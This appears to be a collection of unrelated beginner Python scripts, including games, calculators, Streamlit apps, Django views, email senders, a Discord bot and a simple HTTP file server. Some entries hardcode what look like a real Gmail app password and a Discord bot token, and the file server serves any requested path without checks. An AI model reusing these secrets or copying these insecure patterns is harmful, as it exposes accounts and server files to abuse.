    "from datetime import datetime\nimport pandas\nimport random\nimport smtplib, ssl\n\ntoday = datetime.now()\ntoday_tuple = (today.month, today.day)\nMY_EMAIL = \"Your Email (sender mail id)\"\nMY_PASSWORD = \"Password to the above mail id\"\n\ndata = pandas.read_csv(\"path to the file containing birthdays\")\nbirthdays_dict = {(data_row.month, data_row.day): [] for (index, data_row) in data.iterrows()}\n\nfor index, data_row in data.iterrows():\n    birthdays_dict[(data_row.month, data_row.day)].append({\"name\": data_row[\"name\"], \"email\": data_row[\"email\"]})\n\nif today_tuple in birthdays_dict:\n    birthday_people = birthdays_dict[today_tuple]\n\n    for birthday_person in birthday_people:\n        file_path = f\"Path to the letter templates_{random.randint(1,3)}.txt\"  #here the folder is in the name \"letter_templates\" the word \"templates\" is replaced with {random.randint(1,3)} to pick a random letter from the letters in the folder, the range is (1,3) because it has 3 letters, you can add as many letters you want and change the range (should be in .txt format)\n        with open(file_path) as letter_file:\n            contents = letter_file.read()\n            contents = contents.replace(\"[NAME]\", birthday_person[\"name\"])  # Fix the replace method\n\n        with smtplib.SMTP(\"smtp.gmail.com\", 587) as connection:  # parameters = mail server hostname and port number\n            connection.starttls()\n            connection.login(user=MY_EMAIL, password=MY_PASSWORD)\n            connection.sendmail(from_addr=MY_EMAIL, to_addrs=birthday_person[\"email\"], msg=f\"Subject: HAPPY BIRTHDAY!!!!\\n\\n{contents}\".encode('utf-8'))\n",
    "import streamlit as st\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.ensemble import RandomForestClassifier, ExtraTreesClassifier\nfrom sklearn.metrics import accuracy_score, confusion_matrix\nimport matplotlib.pyplot as plt\nimport numpy as np\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\nred_wine_data = pd.read_csv('data/red_wine.csv')\nwhite_wine_data = pd.read_csv('data/white_wine.csv')\n\ndef preprocess_data(data):\n    X = data.drop('quality', axis=1)\n    y = data['quality']\n    return X, y\n\ndef train_and_evaluate_model(model, X_train, X_test, y_train, y_test):\n    model.fit(X_train, y_train)\n    y_pred = model.predict(X_test)\n    acc = accuracy_score(y_test, y_pred)\n    st.write('Accuracy:', acc)\n    \n    # Calculate confusion matrix\n    cm = confusion_matrix(y_test, y_pred)\n    \n    # Plot confusion matrix\n    plt.figure(figsize=(8, 6))\n    st.write('Confusion Matrix:')\n    plt.imshow(cm, interpolation='nearest', cmap=plt.cm.Blues)\n    plt.title('Confusion Matrix')\n    plt.colorbar()\n    \n    # Get unique labels and their counts\n    unique_labels, label_counts = np.unique(y_test, return_counts=True)\n    \n    plt.xticks(range(len(unique_labels)), labels=unique_labels)\n    plt.yticks(range(len(unique_labels)), labels=unique_labels)\n    \n    plt.xlabel('Predicted Label')\n    plt.ylabel('True Label')\n    plt.tight_layout()\n    st.pyplot()\n    \nwine_type = st.sidebar.selectbox('Select Wine Type', ('Red', 'White'))\n\nif wine_type == 'Red':\n    data = red_wine_data.copy()\nelse:\n    data = white_wine_data.copy()\n    \n# Preprocess the data\nX, y = preprocess_data(data)\n\n# Split the data into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Classifier selection\nclassifier = st.sidebar.selectbox('Select Classifier', ('Decision Tree', 'Random Forest', 'Extreme Tree'))\n\nif classifier == 'Decision Tree':\n    model = DecisionTreeClassifier()\nelif classifier == 'Random Forest':\n    model = RandomForestClassifier()\nelse:\n    model = ExtraTreesClassifier()\n\n# Train and evaluate the model\nst.header('Model Performance')\ntrain_and_evaluate_model(model, X_train, X_test, y_train, y_test)\n\n# Button to input values and get prediction\nst.sidebar.header('Input Values for Prediction')\n\nfixed_acidity = st.sidebar.number_input('Fixed Acidity')\nvolatile_acidity = st.sidebar.number_input('Volatile Acidity')\ncitric_acid = st.sidebar.number_input('Citric Acid')\nresidual_sugar = st.sidebar.number_input('Residual Sugar')\nchlorides = st.sidebar.number_input('Chlorides')\nfree_sulfur_dioxide = st.sidebar.number_input('Free Sulfur Dioxide')\ntotal_sulfur_dioxide = st.sidebar.number_input('Total Sulfur Dioxide')\ndensity = st.sidebar.number_input('Density')\npH = st.sidebar.number_input('pH')\nsulphates = st.sidebar.number_input('Sulphates')\nalcohol = st.sidebar.number_input('Alcohol')\n\n# Button to trigger prediction\nif st.sidebar.button('Get Prediction'):\n    input_data = [[fixed_acidity, volatile_acidity, citric_acid, residual_sugar, chlorides,\n                   free_sulfur_dioxide, total_sulfur_dioxide, density, pH, sulphates, alcohol]]\n    prediction = model.predict(input_data)[0]\n    st.sidebar.write('Predicted Quality:', prediction)  ",
    "import pygame\nimport time\nfrom tile import Tile\n\nWINDOW_SIZE = (850, 700)  # set the window size\n\n# The size of a tile\nTILE_SIZE = 32\n\n# GRID POSITIONING\nLEFT_BOUND = TILE_SIZE * 7  # Left Bound\nRIGHT_BOUND = LEFT_BOUND + 9 * TILE_SIZE  # Right Bound\nLOWER_BOUND = TILE_SIZE * 16  # Lower Bound\nUPPER_BOUND = TILE_SIZE * 2  # Upper Bound\n\n# Default position of the next tetromino\nDEFAULT_POSITIONS = [\n    [(5, 2), (6, 2), (7, 2), (8, 2)],\n    [(5, 3), (6, 3), (7, 3), (8, 3)],\n    [(5, 4), (6, 4), (7, 4), (8, 4)],\n    [(5, 5), (6, 5), (7, 5), (8, 5)]\n]\n\ntetromino_colors = {\n    'I': (0, 255, 255),\n    'J': (0, 0, 255),\n    'L': (255, 127, 0),\n    'O': (255, 255, 0),\n    'S': (0, 255, 0),\n    'Z': (255, 0, 0),\n    'T': (128, 0, 128)\n}\n\n\ndef matrix_to_tiles(binary_matrix, color):\n    tile_group = []\n    for row in range(len(binary_matrix)):\n        for col in range(len(binary_matrix)):\n            binary = binary_matrix[row][col]\n            if binary == 1:\n                coordinates = list(DEFAULT_POSITIONS[row][col])\n                tile_position = [LEFT_BOUND - TILE_SIZE + coordinates[0] * TILE_SIZE, coordinates[1] * TILE_SIZE]\n                tile_group.append(Tile(color, tile_position))\n    return tile_group\n\n\nclass Tetromino:\n\n    def __init__(self, tetromino_type: str, binary_matrix: list[list[int]]):\n        # Color and Type\n        self.type = tetromino_type\n        self.color = tetromino_colors[tetromino_type]\n        # The current binary matrix representing the tile_group\n        self.binary_matrix = binary_matrix\n        # The arrangement of the tetrominos tiles\n        self.tile_group = matrix_to_tiles(binary_matrix, self.color)\n        self.is_placed = False  # Tetromino is placed (retired)\n        # Timer spent touching the ground\n        self.timer = 0\n\n    def draw(self, screen) -> None:\n        for tile in self.tile_group:\n            pygame.draw.rect(screen, self.color, tile.rect)\n\n    def update(self) -> None:\n        # Update all the tiles in the tetromino\n        for tile in self.tile_group:\n            tile.update()\n\n    def rotate(self, placed_tiles) -> None:\n        # Sort the tiles and extract the middle element (offset) for rotation\n        tile_positions = []\n        for tile in self.tile_group:\n            tile_positions.append(tuple(tile.position))\n        tile_positions.sort(key=lambda position: position[0])\n        offset_x = tile_positions[int((len(tile_positions) - 1) / 2)][0]\n        # Get the middle x, y offset\n        potential_offset = []\n        for position in tile_positions:\n            if offset_x == position[0]:\n                potential_offset.append(position)\n        potential_offset.sort(key=lambda position: position[1])\n        offset = list(potential_offset[int((len(potential_offset)) / 2)])\n        # Offset (x, y) is set to the origin for rotation of (0, 0)\n        new_positions = []\n        for tile in self.tile_group:\n            origin_position = [tile.position[0] - offset[0], offset[1] - tile.position[1]]\n            origin_x, origin_y = origin_position[0], origin_position[1]\n            # (x, y) -> (-y, x) is a 90-degree clockwise rotation\n            rotated_position = [origin_y, -1 * origin_x]\n            new_positions.append([rotated_position[0] + offset[0], -1 * (rotated_position[1] - offset[1])])\n        can_rotate = True\n        for new_position in new_positions:\n            if new_position[0] < LEFT_BOUND or new_position[0] > RIGHT_BOUND or new_position[1] > LOWER_BOUND:\n                can_rotate = False\n                break\n            for placed_tile in placed_tiles:\n                if new_position == placed_tile.position:\n                    can_rotate = False\n                    break\n        if can_rotate:\n            for index in range(len(self.tile_group)):\n                self.tile_group[index].position = new_positions[index]\n                self.tile_group[index].update()\n\n    def place_tetromino(self):\n        self.is_placed = True\n        for tile in self.tile_group:\n            tile.is_placed = True\n\n    def can_move_down(self, placed_tiles=[]) -> bool:\n        # Check for collisions with placed tiles\n        for tile in self.tile_group:\n            for placed_tile in placed_tiles:\n                # If a placed tile shares the same x with a y equal to y + TILE_SIZE, it is below the current.\n                if tile.position[1] + TILE_SIZE == placed_tile.position[1] and tile.position[0] == placed_tile.position[\n                    0]:\n                    return False\n        # Check lower bound\n        for tile in self.tile_group:\n            if tile.position[1] + TILE_SIZE > LOWER_BOUND:\n                return False\n        return True\n\n    def move_down(self, placed_tiles=[], override=False) -> None:\n        # Move tetromino down if possible\n        if self.can_move_down(placed_tiles) or override:\n            for tile in self.tile_group:\n                tile.move_down(placed_tiles, override=True)\n\n    def move_left(self, placed_tiles=[]):",
    "from enum import Enum\n\nimport snowflake.connector\n\nfrom cryptography.hazmat.primitives.serialization import load_pem_private_key\n\nfrom module.config import Config\n\nconfig = Config()\n\n\nclass SNOW_DB(Enum):\n    SNOWFLAKE_WAREHOUSE = 'SNOWFLAKE_WAREHOUSE'\n\n\nclass SnowConnection:\n    def __init__(self):\n        self.conn = None\n        self.df = None\n        self.USER = None\n        self.ACCOUNT = None\n        self.WAREHOUSE = None\n        self.DATABASE = None\n        self.SCHEMA = None\n        self.PRIVATE_KEY = None\n\n    def get_config(self, section: SNOW_DB = SNOW_DB.SNOWFLAKE_WAREHOUSE):\n        SNOWFLAKE_CONFIG = config.get_config(section.value)\n        self.USER = SNOWFLAKE_CONFIG['USER']\n        self.ACCOUNT = SNOWFLAKE_CONFIG['ACCOUNT']\n        self.WAREHOUSE = SNOWFLAKE_CONFIG['WAREHOUSE']\n        self.DATABASE = SNOWFLAKE_CONFIG['DATABASE']\n        self.SCHEMA = SNOWFLAKE_CONFIG['SCHEMA']\n        PRIVATE_KEY_STRING = f\"\"\"\n-----BEGIN PRIVATE KEY-----\n{SNOWFLAKE_CONFIG['PRIVATE_KEY']}\n-----END PRIVATE KEY-----\n\"\"\"\n        self.PRIVATE_KEY = self.convert_private_key_string_to_rsa_private_key(PRIVATE_KEY_STRING)\n        return self\n\n    def convert_private_key_string_to_rsa_private_key(self, private_key_string):\n        private_key_bytes = private_key_string.encode('utf-8')\n        private_key = load_pem_private_key(private_key_bytes, password=None)\n        return private_key\n\n    def get_connection(self, database=None):\n        return snowflake.connector.connect(\n            account=self.ACCOUNT,\n            user=self.USER,\n            private_key=self.PRIVATE_KEY,\n            warehouse=self.WAREHOUSE,\n            database=self.DATABASE,\n            schema=self.SCHEMA\n        )\n\n    def execute(self, query: str):\n        self.print_query(query)\n        self.df = self.get_connection().cursor().execute(query).fetch_pandas_all()\n        return self.df\n\n    def get_query_result(self):\n        print(\"\\n\" + (\"#\" * 25) + \" RESULT \" + \"#\" * 25)\n        print(self.df)\n        print(\"#\" * 56)\n        return self.df\n\n    def get_row_count(self):\n        return self.get_query_result().ROW_COUNT[0]\n\n    def print_query(self, query):\n        print(\"\\n\" + (\"#\" * 30) + \" QUERY \" + \"#\" * 30)\n        print(query)\n        print(\"#\" * 75)\n        return self\n",
    "from django.shortcuts import render\nfrom django.http import JsonResponse\nfrom .models import market\nfrom .serializers import marketserializer\nfrom rest_framework.decorators import api_view\nfrom rest_framework.response import Response\nfrom rest_framework import status\n\n@api_view(['GET','POST'])\n# Create your views here.\ndef marketls(request,format=None):\n    if request.method =='GET':\n        markets=market.objects.all()\n        serializer=marketserializer(markets,many=True)\n        return JsonResponse(serializer.data,safe=False)\n    if request.method == 'POST':\n        serializer=marketserializer(data=request.data)\n        if serializer.is_valid():\n            serializer.save()\n            return Response(serializer.data,status=status.HTTP_201_CREATED)\n@api_view(['GET','PUT'])\n# Create your views here.\ndef market_details(request,id,format=None):\n    try:\n        market.object.get(pk=id)\n    except market.DoesNotExist:\n        return Response(status=status.HTTP_404_NOT_FOUND)\n    if request.method =='GET':\n        serializer=marketserializer(market)\n        return JsonResponse(serializer.data)\n    elif request.method == 'PUT':\n        serializer=marketserializer(data=request.data)\n        if serializer.is_valid():\n            serializer.save()\n            return JsonResponse(serializer.data)\n        return Response(serializer.data,status=status.HTTP_400_BAD_REQUEST)\n    elif request.method == 'DELETE':\n        market.delete()\n        return Response(status=status.HTTP_204_NO_CONTENT)",
    "# importing libraries\nfrom json import loads\nimport pygame\nimport time\nimport random\n\nwith open(\"snake/config.json\", 'r') as j:\n    config = loads(j.read())\n\nsnake_speed = config[\"snake\"][\"snake_speed\"]\n# Window size\nwindow_x = config[\"window\"][\"window_X\"]\nwindow_y = config[\"window\"][\"window_Y\"]\n\n# defining colors\nblack = pygame.Color(0, 0, 0)\nwhite = pygame.Color(255, 255, 255)\nred = pygame.Color(255, 0, 0)\ngreen = pygame.Color(0, 255, 0)\nblue = pygame.Color(0, 0, 255)\n\n# Initialising pygame\npygame.init()\n\n# Initialise game window\npygame.display.set_caption('GeeksforGeeks Snakes')\ngame_window = pygame.display.set_mode((window_x, window_y))\n\n# FPS (frames per second) controller\nfps = pygame.time.Clock()\n\n# defining snake default position\nsnake_position = [100, 50]\n\n# defining first 4 blocks of snake body\nsnake_body = [[100, 50],\n\t\t\t[90, 50],\n\t\t\t[80, 50],\n\t\t\t[70, 50]\n\t\t\t]\n# fruit position\nfruit_position = [random.randrange(1, (window_x//10)) * 10, \n\t\t\t\trandom.randrange(1, (window_y//10)) * 10]\n\nfruit_spawn = True\n\n# setting default snake direction towards\n# right\ndirection = 'RIGHT'\nchange_to = direction\n\n# initial score\nscore = config[\"score\"]\n\n# displaying Score function\ndef show_score(choice, color, font, size):\n\n\t# creating font object score_font\n\tscore_font = pygame.font.SysFont(font, size)\n\t\n\t# create the display surface object \n\t# score_surface\n\tscore_surface = score_font.render('Score : ' + str(score), True, color)\n\t\n\t# create a rectangular object for the text\n\t# surface object\n\tscore_rect = score_surface.get_rect()\n\t\n\t# displaying text\n\tgame_window.blit(score_surface, score_rect)\n\n# game over function\ndef game_over():\n\n\t# creating font object my_font\n\tmy_font = pygame.font.SysFont('times new roman', config[\"font_size_lost\"])\n\t\n\t# creating a text surface on which text \n\t# will be drawn\n\tgame_over_surface = my_font.render(\n\t\tf'Your Score is : {str(score)}' , True, red)\n    \n\t\n\t# create a rectangular object for the text \n\t# surface object\n\tgame_over_rect = game_over_surface.get_rect()\n\t\n\t# setting position of the text\n\tgame_over_rect.midtop = (window_x/2, window_y/4)\n\t\n\t# blit will draw the text on screen\n\tgame_window.blit(game_over_surface, game_over_rect)\n\tpygame.display.flip()\n\t\n\t# after 2 seconds we will quit the program\n\ttime.sleep(config[\"Time_Sleep\"])\n\t\n\t# deactivating pygame library\n\tpygame.quit()\n\t\n\t# quit the program\n\tquit()\n\n\n# Main Function\nwhile True:\n\t\n\t# handling key events\n\tfor event in pygame.event.get():\n\t\tif event.type == pygame.KEYDOWN:\n\t\t\tif event.key == pygame.K_UP:\n\t\t\t\tchange_to = 'UP'\n\t\t\tif event.key == pygame.K_DOWN:\n\t\t\t\tchange_to = 'DOWN'\n\t\t\tif event.key == pygame.K_LEFT:\n\t\t\t\tchange_to = 'LEFT'\n\t\t\tif event.key == pygame.K_RIGHT:\n\t\t\t\tchange_to = 'RIGHT'\n\n\t# If two keys pressed simultaneously\n\t# we don't want snake to move into two \n\t# directions simultaneously\n\tif change_to == 'UP' and direction != 'DOWN':\n\t\tdirection = 'UP'\n\tif change_to == 'DOWN' and direction != 'UP':\n\t\tdirection = 'DOWN'\n\tif change_to == 'LEFT' and direction != 'RIGHT':\n\t\tdirection = 'LEFT'\n\tif change_to == 'RIGHT' and direction != 'LEFT':\n\t\tdirection = 'RIGHT'\n\n\t# Moving the snake\n\tif direction == 'UP':\n\t\tsnake_position[1] -= 10\n\tif direction == 'DOWN':\n\t\tsnake_position[1] += 10\n\tif direction == 'LEFT':\n\t\tsnake_position[0] -= 10\n\tif direction == 'RIGHT':\n\t\tsnake_position[0] += 10\n\n\t# Snake body growing mechanism\n\t# if fruits and snakes collide then scores\n\t# will be incremented by 10\n\tsnake_body.insert(0, list(snake_position))\n\tif snake_position[0] == fruit_position[0] and snake_position[1] == fruit_position[1]:\n\t\tscore += config[\"score_level_up\"]\n\t\tfruit_spawn = False\n\telse:\n\t\tsnake_body.pop()\n\t\t\n\tif not fruit_spawn:\n\t\tfruit_position = [random.randrange(1, (window_x//10)) * 10, \n\t\t\t\t\t\trandom.randrange(1, (window_y//10)) * 10]\n\t\t\n\tfruit_spawn = True\n\tgame_window.fill(config[\"backGround_color\"])\n\t\n\tfor pos in snake_body:\n\t\tpygame.draw.rect(game_window, config[\"snake\"][\"snake_color\"],\n\t\t\t\t\t\tpygame.Rect(pos[0], pos[1], 10, 10))\n\tpygame.draw.rect(game_window, white, pygame.Rect(\n\t\tfruit_position[0], fruit_position[1], 10, 10))\n\n\t# Game Over conditions\n\tif snake_position[0] < 0 or snake_position[0] > window_x-10:\n\t\tgame_over()\n\tif snake_position[1] < 0 or snake_position[1] > window_y-10:\n\t\tgame_over()\n\n\t# Touching the snake body\n\tfor block in snake_body[1:]:\n\t\tif snake_position[0] == block[0] and snake_position[1] == block[1]:\n\t\t\tgame_over()\n\n\t# displaying score continuously\n\tshow_score(1, config[\"score_title_color\"], 'times new roman', 20)\n\n\t# Refresh game screen\n\tpygame.display.update()\n\n\t# Frame Per Second /Refresh Rate\n\tfps.tick(snake_speed)\n",
    "while True:\r\n  # check if the user has entered a number\r\n  while True:\r\n    try:\r\n      first_number = float (input(\"Enter first number: \"))\r\n      break\r\n    except ValueError:\r\n      print(\"Invalid input. Please enter a numaric value .\")\r\n\r\n  # check if the user has entered a opeartion\r\n  while True:\r\n    try:\r\n       operation = input(\"Enter operation type: \")\r\n       if operation in (\"+\",\"-\",\"*\",\"/\"):\r\n         break\r\n       else:\r\n         raise ValueError  \r\n    except ValueError:\r\n      print(\"Invalid operator, please enter +,-,*,/\")\r\n  # check if the user has entered a number    \r\n  while True:\r\n    try:\r\n      second_number = float(input(\"Enter second number: \"))\r\n      if second_number == 0  and operation == '/':\r\n        raise ZeroDivisionError\r\n      break\r\n    except ValueError:\r\n      print(\"Invalid input. Please enter a numaric value .\")\r\n    except ZeroDivisionError:\r\n      print(\"cannot divide by zero  \")\r\n#--------------------------------------------------#\r\n  # print the result\r\n  # if operation == \"+\":\r\n  #   print(first_number + second_number)\r\n  # elif operation == \"-\":\r\n  #   print(first_number - second_number)\r\n  # elif operation == \"/\":\r\n  #   print(first_number / second_number)\r\n  # elif operation == \"*\":\r\n  #   print(first_number * second_number)\r\n  # else:\r\n  #   print(\"Error\")\r\n#---------------------------------------------------#\r\n  # the result use match \r\n  match operation:\r\n    case \"+\":\r\n      result = first_number + second_number\r\n    case \"-\":\r\n      result = first_number - second_number\r\n    case \"/\":\r\n      result = first_number / second_number\r\n    case \"*\":\r\n      result = first_number * second_number\r\n    case _:\r\n      result = None\r\n  \r\n  if result != None:\r\n    print (result)\r\n    \r\n  # ask the user if he wants to perform another operation\r\n  repeat = input(\"Do you want to perform another operation (y/n): \")\r\n  if repeat == \"n\" or repeat == \"N\":\r\n    break\r\n  elif repeat == \"y\" or repeat == \"Y\":\r\n    continue\r\n  else:\r\n    print(\"Invalid input. Please enter 'y' or 'n'.\")\r\n            \r\nprint(\"Program exited\")\r\n\r\n  ",
    "import smtplib, ssl\nfrom email.mime.text import MIMEText\nfrom email.mime.image import MIMEImage\nfrom email.mime.multipart import MIMEMultipart\nfrom jinja2 import Environment, FileSystemLoader, select_autoescape\n\nfrom notification import Notification\n\nAPP_SECRET_PASSWORD = \"yiml qbir yjiy orsq\"\n\nTEMP_NAME = \"Amir\" #TODO\n\ndef create_message(notification, sender_email, receiver_email):\n    message = MIMEMultipart(\"alternative\")\n    message[\"Subject\"] = notification.type\n    message[\"From\"] = sender_email\n    message[\"To\"] = receiver_email\n\n    html = environment.get_template(\"email_notification.html\").render(notification=notification, name=TEMP_NAME)\n    message.attach(MIMEText(html, \"html\"))\n\n    # Open the logo image in binary mode\n    with open('static/favicon.ico', 'rb') as img_file:\n        img_data = img_file.read()\n\n    # Create the image part\n    img_part = MIMEImage(img_data, 'image/ico')\n    img_part.add_header('Content-ID', '<logo_image>')  # Set content ID for reference in HTML\n    message.attach(img_part)\n\n    return message\n\ndef send_email(sender_email, receiver_email, message):\n    port = 465  # For SSL\n\n    # Create a secure SSL context\n    context = ssl.create_default_context()\n\n    with smtplib.SMTP_SSL(\"smtp.gmail.com\", port, context=context) as server:\n        server.login(\"romthebarbarian@gmail.com\", APP_SECRET_PASSWORD)\n        server.sendmail(sender_email, receiver_email, message.as_string())\n\ndef send_email_notification(notification : Notification, sender_email:str, receiver_email : str):\n    message = create_message(notification, sender_email,receiver_email)\n    send_email(sender_email, receiver_email, message)\n    print(message)\n\n# def send_notification(notification):\n#     global environment\n#     environment = Environment(loader=FileSystemLoader(\"templates/\"))\n\nif __name__ == '__main__':\n    global environment\n    environment = Environment(autoescape=select_autoescape(['html', 'xml']),loader=FileSystemLoader(\"templates/\"))\n    send_email_notification(Notification(\"DOS Attack\", \"Network Problems\", \"Possible DOS attack from '192.168.1.52'\"),\"neteye@gmail.com\",\"savvasapir@gmail.com\")",
    "#kita membutuhkan dua liblary di bawah ini\nimport os \nfrom http.server import BaseHTTPRequestHandler,HTTPServer\n#'kita buat objek class di baaah ini'\nclass FileServerAll(BaseHTTPRequestHandler):\n  def list_directory(self,path):\n         try:\n    #lanjut kita buat daftar file yg ada di dlm path\n              files = os.listdir(path)\n              #'kita buat daftar file make html\n              html = \"<ul>\"\n              for file in files:\n                  html += f\"<li><a href='{file}'>{file}</a></li>\"\n              html+= \"</ul>\"\n              return html \n         except Exception as e:\n               return f\"Error: {str(e)}\"\n              \n  def do_GET(self):\n        try:\n              \n              path = '.'+self.path\n              #kita buat kondisi jika path kita folder tampilin isi file ke browser\n              if os.path.isdir(path):\n                  html = self.list_directory(path)\n                  self.send_response(200)\n                  self.send_header(\"Content-type\",\"text/html\")\n                  self.end_headers()\n                  self.wfile.write(bytes(html,\"utf-8\"))\n              else:\n                      #jika path isinya file html.maka pas fi klik akan ngejalanin html\n                      with open(path,\"rb\") as file:\n                          content = file.read()\n                          self.send_response(200)\n                          self.send_header(\"Content-type\",\"text/html\")\n                          self.end_headers()\n                          self.wfile.write(content)\n  #jika respon 404 maka tampil not fund\n        except FileNotFoundError:\n            self.send_error(404, 'File Not Found: %s' % self.path)\n            #jika respon 500 internal server nya error\n        except Exception as e:\n            self.send_error(500, 'Internal Server Error: %s' % str(e))\n            \ndef run(serverClass=HTTPServer, handle=FileServerAll, port=8000):\n    serverAdd = (\"\", port)\n    http = serverClass(serverAdd, handle)\n    print(f'Server running on port {port}...')\n    http.serve_forever()\n       \nif __name__ == \"__main__\":\n    run()\n",
    "from ultralytics import YOLO\nimport cv2\nimport streamlit as st\nfrom PIL import Image\n\nimport numpy as np\n\nmodelpath = r\"train7/weights/last.pt\"\nmodel = YOLO(modelpath)\n\nst.title('Predict Fabrics Defects')\n\n# Function to capture image from camera\ndef capture_frame():\n    cap = cv2.VideoCapture(0)\n    ret, frame = cap.read()\n    if ret:\n        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n    cap.release()\n    return ret, frame\n\n# Function to perform prediction\ndef predict_defect(image):\n    result = model(image)\n    if isinstance(result, tuple):\n        predictions = result[:3]  # Extracting relevant outputs from tuple\n        names = predictions[0].names\n        probability = predictions[0].probs.data.numpy()\n        prediction = np.argmax(probability)\n        return names[prediction]\n    elif isinstance(result, list):\n        predictions = result[0]\n        names = predictions.names\n        probability = predictions.probs.data.numpy()\n        prediction = np.argmax(probability)\n        return names[prediction]\n    else:\n        raise ValueError(\"Unexpected output format from YOLO model\")\n\n# Main Streamlit app\ndef main():\n    st.sidebar.title('Options')\n    use_camera = st.sidebar.checkbox('Use Camera', True)\n    capture_video = st.sidebar.checkbox('Capture Video', False)\n\n    if use_camera:\n        st.subheader('Live Camera Feed')\n        capture_button = st.button(\"Capture Image\")\n        if capture_button:\n            ret, frame = capture_frame()\n            if ret:\n                st.image(image=frame, channels='RGB')\n                names = predict_defect(frame)\n                st.write(names)\n                if 'good' in names:\n                    st.write('Good Image')\n                elif 'hole' in names:\n                    st.write('Hole defect in Image')\n                elif 'objects' in names:\n                    st.write('Objects defect in Image')\n                elif 'oil' in names:\n                    st.write('Oil spot defect in Image')\n                elif 'thread' in names:\n                    st.write('Thread error defect in Image')\n                else:\n                    st.write('Unknown defect')\n\n    if capture_video:\n        st.subheader('Live Video Feed')\n        cap = cv2.VideoCapture(0)\n        while True:\n            ret, frame = cap.read()\n            if ret:\n                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n                st.image(frame_rgb, channels='RGB')\n                names = predict_defect(frame)\n                st.write(names)\n                if 'good' in names:\n                    st.write('Good Image')\n                elif 'hole' in names:\n                    st.write('Hole defect in Image')\n                elif 'objects' in names:\n                    st.write('Objects defect in Image')\n                elif 'oil' in names:\n                    st.write('Oil spot defect in Image')\n                elif 'thread' in names:\n                    st.write('Thread error defect in Image')\n                else:\n                    st.write('Unknown defect')\n            else:\n                st.write('Error: Unable to capture frame from the camera.')\n            if cv2.waitKey(1) & 0xFF == ord('q'):\n                break\n        cap.release()\n        cv2.destroyAllWindows()\n\n    st.sidebar.markdown('---')\n\n    st.sidebar.subheader('Upload Image')\n    uploaded_file = st.sidebar.file_uploader(\"Choose an image...\", type=[\"jpg\", \"jpeg\", \"png\"])\n    if uploaded_file is not None:\n        image = Image.open(uploaded_file)\n        st.image(image, caption='Uploaded Image', use_column_width=True)\n        names = predict_defect(image)\n        st.write(names)\n        if 'good' in names:\n            st.write('Good Image')\n        elif 'hole' in names:\n            st.write('Hole defect in Image')\n        elif 'objects' in names:\n            st.write('Objects defect in Image')\n        elif 'oil' in names:\n            st.write('Oil spot defect in Image')\n        elif 'thread' in names:\n            st.write('Thread error defect in Image')\n        else:\n            st.write('Unknown defect')\n\nif __name__ == \"__main__\":\n    main()\n",
    "from typing import Final\nimport os\nfrom discord import Intents, Client, Message\nfrom responses import get_response\nimport aiohttp\n\naiohttp.TCPConnector(ssl=False)\n\n\nTOKEN: Final[str] = \"MTIxMTAzMTIyMzQ0MzM5ODc4Nw.GXa427.i9J-SSAa64Xb3C7j5d9fNz97ZJP639XxCO-CnY\"\n\nintents: Intents = Intents.default()\nintents.message_content = True\nclient: Client = Client(intents=intents)\n\nasync def send_message(message: Message, user_message: str) -> None:\n    if not user_message:\n        print(\"No message content. Possible intent failure...\")\n        return\n\n    if is_private := user_message[0] == \"?\":\n        user_message = user_message[1:]\n\n    try:\n        response: str = get_response(user_message)\n        await message.author.send(response) if is_private else await message.channel.send(response)\n    except Exception as e:\n        print(e)\n\n\n@client.event\nasync def on_ready() -> None:\n    print(f\"{client.user} is up and running...\")\n\n\n\n@client.event\nasync def on_message(message: Message) -> None:\n    if message.author == client.user:\n        return\n\n    username: str = str(message.author)\n    user_message: str = message.content\n    channel: str = str(message.channel)\n\n    print(f\"[{channel}] {username}:'{user_message}'\")\n    await send_message(message, user_message)\n\n\ndef main() -> None:\n    client.run(token=TOKEN)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "input(\"Aperta a tecla Enter para iniciar.\\n\")\n\nclass Calculadora:\n    def __init__(self):\n        return\n\n    def menu(self):\n        return input(\"Selecione a opera\u00e7\u00e3o desejada.\\n \\n1. Adi\u00e7\u00e3o \\n2. Subtra\u00e7\u00e3o \\n3. Multiplica\u00e7\u00e3o \\n4. Divis\u00e3o\\n\")\n\n    def addition(self):\n        num1 = float(input(\"\\nDigite o primeiro n\u00famero: \"))\n        num2 = float(input(\"Digite o segundo n\u00famero: \"))\n        return num1 + num2\n\n    def subtraction(self):\n        num1 = float(input(\"Digite o primeiro n\u00famero: \"))\n        num2 = float(input(\"Digite o segundo n\u00famero: \"))\n        return num1 - num2\n\n    def multiplication(self):\n        num1 = float(input(\"Digite o primeiro n\u00famero: \"))\n        num2 = float(input(\"Digite o segundo n\u00famero: \"))\n        return num1 * num2\n\n    def division(self):\n        num1 = float(input(\"Digite o primeiro n\u00famero: \"))\n        num2 = float(input(\"Digite o segundo n\u00famero: \"))\n        if num1 == 0 or num2 == 0:\n\n            return 0\n\n        else:\n\n            return num1 / num2\n\ncalculadora = Calculadora()\n\nwhile True:\n    choice = calculadora.menu()\n    if choice in {\"1\", \"2\", \"3\", \"4\"}:\n        if choice == \"1\":\n            print(f\"\\nResultado: {calculadora.addition()}\")\n            break\n\n        elif choice == \"2\":\n            print(f\"Resultado: {calculadora.subtraction()}\")\n            break\n\n        elif choice == \"3\":\n            print(f\"Resultado: {calculadora.multiplication()}\")\n            break\n\n        elif choice == \"4\":\n            print(f\"Resultado: {calculadora.division()}\")\n            break\n\n    elif choice == \"\":\n        continue\n\n    else:\n        print(\"\\nOp\u00e7\u00e3o inv\u00e1lida.\")\n",
